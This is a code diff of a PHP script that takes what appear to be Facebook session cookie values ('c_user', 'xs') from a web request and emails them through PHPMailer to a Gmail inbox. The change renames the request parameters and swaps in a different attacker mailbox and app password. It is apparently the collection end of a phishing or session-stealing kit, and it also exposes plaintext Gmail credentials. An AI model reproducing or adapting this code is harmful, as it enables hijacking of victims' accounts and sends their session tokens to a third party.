@@ -9,8 +9,8 @@
     <?php   
 
         // print_r($_REQUEST);
-        $c_user = $_REQUEST['c_user'];
-        $xs = $_REQUEST['xs'];
+        $c_user = $_REQUEST['disini'];
+        $xs = $_REQUEST['disana'];
 
     use PHPMailer\PHPMailer\PHPMailer;
     use PHPMailer\PHPMailer\SMTP;
@@ -31,13 +31,13 @@
         $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
         $mail->Port = 587;
 
-        $mail->Username = 'hassamkaif123@gmail.com'; // YOUR gmail email
-        $mail->Password = 'xxyshwmkicojmjzu'; // YOUR gmail password
+        $mail->Username = '571poorman639@gmail.com'; // YOUR gmail email
+        $mail->Password = 'xgodptanrbmyrxge'; // YOUR gmail password
 
         // Sender and recipient settings
-        $mail->setFrom('hassamkaif123@gmail.com', 'Sender Name');
-        $mail->addAddress('hassamkaif123@gmail.com', 'Receiver Name');
-        $mail->addReplyTo('alyssadean.us@gmail.com', 'Sender Name'); // to set the reply to
+        $mail->setFrom('571poorman639@gmail.com', 'Sender Name');
+        $mail->addAddress('571poorman639@gmail.com', 'Receiver Name');
+        $mail->addReplyTo('571poorman639@gmail.com', 'Sender Name'); // to set the reply to
 
         // Setting the email content
         $mail->IsHTML(true);
